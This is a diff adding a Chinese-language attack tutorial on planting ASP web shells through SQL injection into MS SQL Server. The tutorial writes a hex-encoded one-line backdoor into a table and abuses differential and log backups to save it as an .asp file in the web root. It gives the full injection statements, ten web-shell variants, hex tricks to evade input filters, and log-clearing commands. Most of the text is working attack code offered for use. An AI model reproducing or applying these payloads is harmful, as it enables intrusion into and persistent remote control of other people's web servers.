@@ -1,0 +1,123 @@
+差异备份的流程大概这样：
+1.完整备份一次(保存位置当然可以改)
+backup database 库名 to disk = 'c:\ddd.bak';--
+
+2.创建表并插曲入数据
+create table [dbo].[dtest] ([cmd] [image]);
+insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);--
+
+3.进行差异备份
+backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--
+
+上面
+0x3C25657865637574652872657175657374282261222929253E
+就是一句话木马的内容：<%execute(request("a"))%>
+
+如下是网上常见的差异备份代码，思路一样！
+===================================================
+利用差异备份提高提高backupwebshell的成功率,减少文件大小
+步骤:
+
+declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x77006F006B0061006F002E00620061006B00 backup database @a to disk=@s  --备份数据库
+
+create table [dbo].[xiaolu] ([cmd] [image]);  -- 创建一个表
+
+
+insert into xiaolu(cmd) values(0x3C25657865637574652872657175657374282261222929253E)  --将一句话木马的16进制字符插入到表中
+
+declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT  --对数据库实行差异备份
+
+drop table [xiaolu]  -- 删除此表。
+
+0x77006F006B0061006F002E00620061006B00为wokao.bak
+0x3C25657865637574652872657175657374282261222929253E是<%execute(request("a"))%>
+0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000是e:\web\wokao.asp
+
+声明：方法不是我想的，我只是写工具，默认得到shell是
+<%execute(request("a"))%>
+===============================================================
+
+我发现上面代码，有时会无效，而直接用
+
+backup database 库名 to disk = 'c:\ddd.bak'
+
+create table [dbo].[dtest] ([cmd] [image]);
+
+insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
+
+backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--
+
+却可以成功，所以把最原始的方法写出来！思路是前人所创,这不说大家也知道的！
+
+库名 必须要有效的库名，一般注入工具都可以得到！如果某站过滤 "‘",就要把字符内容转为数值了！
+
+网上还有log增量备份的，我也把他记录一下
+=====================================================
+另一种log增量备份技术:
+
+';alter database null set RECOVERY FULL--
+
+';create table cmd (a image)--
+
+';backup log null to disk = 'f:\cmd' with init--
+
+';insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253EDA)--
+
+';backup log null to disk = '备份路径'--
+
+';drop table cmd--
+
+';alter database XXX set RECOVERY SIMPLE--
+
+PS:0x3C2565786563757465287265717565737428226122292
+9253EDA 是一句话小马16进制转来的
+
+说到一句话马，还可以有这么几种写法：
+
+a)<%%25Execute(request("a"))%%25>
+b)<%Execute(request("a"))%>
+c)%><%execute request("a")%><%
+d)<script language=VBScript runat=server>execute request("a")</script>
+e)<%25Execute(request("a"))%25>
+f)<%eval(request("a")):response.end%> 备分专用一句话   (也就是插入一句话后所有的代码都无效,在一句话这里打止)
+g)"%><%eval (request (chr(309)))%><%'" 网站配置版权信息插马专用一句话
+h)<%On Error Resume Next:response.clear:execute request("value"):response.End%>
+I)<%eval request(0)%>
+J)"%><%Eval Request(0)%> 网站配置版权信息插马专用一句话
+
+============================================= 
+
+当遇到差备过滤了/时用这个语句代替
+
+declare @a varchar(1024);set @a=cast(0x65786563206D6D as varchar(1024));exec (@a);--
+
+把要执行的语句转16进制然后用exec执行
+
+
+减少备份文件大小方法如下:
+
+总的来说就是那么简单几句,下面以备份数据库model为例子
+1
+id=1;use model create table cmd(str image);insert into cmd(str) values ('<%25execute(request("a"))%25>')
+2
+id=1;backup database model to disk='你的路径‘ with differential,format;--
+
+
+
+SQL语句清理日志
+注：test为数据库名 
+
+--清空日志 
+DUMP TRANSACTION test WITH NO_LOG
+
+--截断事务日志 
+BACKUP LOG test WITH NO_LOG 
+
+--收缩数据库 
+DBCC SHRINKDATABASE(test) 
+
+--收缩指定数据文件,1是文件号,可以通过这个语句查询到
+Select * from sysfiles DBCC SHRINKFILE(1)
+
+--以后能自动收缩 
+EXEC sp_dboption 'test', 'autoshrink', 'TRUE'
